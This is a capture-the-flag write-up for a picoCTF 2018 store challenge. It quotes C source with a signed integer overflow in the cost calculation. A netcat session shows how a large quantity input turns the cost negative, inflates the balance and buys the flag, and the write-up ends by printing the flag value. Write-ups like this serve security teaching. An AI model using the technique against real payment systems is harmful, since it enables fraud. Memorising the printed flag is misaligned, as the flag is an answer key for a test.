#LEVELGOAL

Westartedalittlestore[1],canyoubuytheflag?Source[2].Connectwith2018shell1.picoctf.com5795.

#HINTS

(1)Two'scomplimentcandosomeweirdthingswhennumbersgetreallybig!

#SOLUTION

It felt more awesome to see the effect rather than exploiting this vulnerability.

Let's look at the source file. Download `source.c` from the challenge window.

```
nikhilh@ubuntu:~/Downloads$ cat source.c
...
        if(auction_choice == 1){
            printf("Imitation Flags cost 1000 each, how many would you like?\n");
                
            int number_flags = 0;
            fflush(stdin);
            scanf("%d", &number_flags);
            if(number_flags > 0){
                int total_cost = 0;
                total_cost = 1000*number_flags;
                printf("\nYour total cost is: %d\n", total_cost);
                if(total_cost <= account_balance){
                    account_balance = account_balance - total_cost;
                    printf("\nYour new balance: %d\n\n", account_balance);
                }
                else{
                    printf("Not enough funds\n");
                }
            }
        }
...
        if(account_balance > 100000){
            printf("YOUR FLAG IS:\n");
        }
        else{
            printf("\nNot enough funds for transaction\n\n\n");
        }
...
```

So, our aim is to get our balance to go beyond `100000` and to get there, we'll use a vulnerability called `Integer Overflow`. Study this block of code:

```
int total_cost = 0;
total_cost = 1000*number_flags;
```

What would happen if value of `number_flags` is so high that `total_cost` overflows? `total_cost` is a `signed int` type, so it can hold a maximum value of `2^31 - 1` (assuming `int` is 4 bytes). So, rom the equation that we have, if we input a value little more than `(2^31 - 1) / 1000`, we should be able to overflow `total_cost`.

```
nikel@pico-2018-shell-1:/problems/absolutely-relative_4_bef88c36784b44d2585bb4d2dbe074bd$ nc 2018shell1.picoctf
.com 5795

Welcome to the Store App V1.0
World's Most Secure Purchasing App

[1] Check Account Balance
[2] Buy Stuff
[3] Exit

Enter a menu selection
1

Balance: 1100 

Welcome to the Store App V1.0
World's Most Secure Purchasing App

[1] Check Account Balance
[2] Buy Stuff
[3] Exit

Enter a menu selection
2
Current Auctions
[1] I Can't Believe its not a Flag!                                                                            
[2] Real Flag                                                                                                  
1                                                                                                              
Imitation Flags cost 1000 each, how many would you like?                                                       
2148484                                                                                                        
                                                                                                               
Your total cost is: -2146483296                                                                                

Your new balance: 2146484396                                                                                   

Welcome to the Store App V1.0                                                                                  
World's Most Secure Purchasing App                                                                             
                                                                                                               
[1] Check Account Balance                                                                                      
[2] Buy Stuff                                                                                                  
[3] Exit                                                                                                       
                                                                                                               
Enter a menu selection                                                                                        
2                                                                                                              
Current Auctions                                                                                               
[1] I Can't Believe its not a Flag!                                                                            
[2] Real Flag                                                                                                  
2                                                                                                              
A genuine Flag costs 100000 dollars, and we only have 1 in stock                                               
Enter 1 to purchase1                                                                                           
YOUR FLAG IS: picoCTF{numb3r3_4r3nt_s4f3_dbd42a50}                                                             
```

#FLAG

picoCTF{numb3r3_4r3nt_s4f3_dbd42a50}
